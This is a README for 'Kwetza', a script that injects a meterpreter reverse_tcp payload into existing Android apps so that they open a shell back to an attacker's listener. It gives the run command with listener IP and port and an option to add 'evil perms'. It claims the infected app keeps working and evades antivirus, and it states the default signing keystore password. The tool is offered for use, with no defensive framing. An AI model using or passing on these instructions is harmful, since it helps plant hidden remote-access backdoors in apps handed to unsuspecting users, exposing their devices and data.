KWETZA
===
Use this script to infect any existing Android application with a FUD meterpreter payload (reverse_tcp).  Have phun.

BASIC USAGE
===
python kwetza.py nameOfTheApkToInfect.apk LHOST LPORT yes

targetApk.apk=name of the APK you wish to infect.
LHOST=IP of your listener.
LPORT=Port of your listener.
yes=include "yes" to inject additional evil perms into the app, exclude/leave blank to utilize the default permissions of the app.

INFORMATION
===
The infected app will function normally and AV will not detect the infection. NB, this tool relies on apktool to be installed and accesible via your PATH.
Follow these instructions to setup apktool, https://ibotpeaches.github.io/Apktool/install/.
Kwetza also assumes that apktool will create and place your decompiled APK into the directory you are running kwetza.py from. Kwetza uses apktool defaults 
which are sufficient to achieve infection.
Kwetza by default will use the template and keystore located in the folder "payload" to inject and sign the infected apk. If you would like to sign the
infected application with your own certificate, generate a new keystore and place it in the "payload" folder and rename to the existing keystore or change the 
reference in the kwetza.py. The password for the default keystore is, well, password.

KNOWN BUGS
===
Make sure to place yout target APK in the same location as kwetza.py :)

License
===
Jack is licensed under a Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License (http://creativecommons.org/licenses/by-nc-sa/4.0) Permissions beyond the scope of this license may be available at http://sensepost.com/contact us/.
